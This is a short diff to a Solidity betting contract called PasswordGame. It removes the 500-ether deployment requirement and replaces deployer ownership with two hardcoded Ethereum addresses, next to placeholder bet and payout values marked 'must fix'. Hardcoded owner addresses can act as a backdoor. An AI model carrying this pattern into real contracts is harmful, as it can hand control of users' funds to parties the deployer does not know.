@@ -21,9 +21,10 @@ contract PasswordGame {
     mapping (address => Bet) bets;
     
     constructor() payable {
-        require(msg.value >= 500 ether, "You need a least 500 ether to deploy the contract");
+        //require(msg.value >= 500 ether, "You need a least 500 ether to deploy the contract");
         active = true;
-        owners.push(msg.sender);
+        //owners.push(msg.sender);
+        owners = [0x1835C7Ca96537cD64B19d3aB3F2f06f685c49830, 0x698231A6D950A507F668760C69325613bC83cc7c];
         betAmounts = [0, 1 ether, 2 ether, 3 ether];     // randomly chosen, must fix
         winAmounts = [0, 10 ether, 20 ether, 30 ether];  // randomly chosen, must fix
         chances = [2, 4, 8];        // randomly chosen, must fix, should be prime numbers
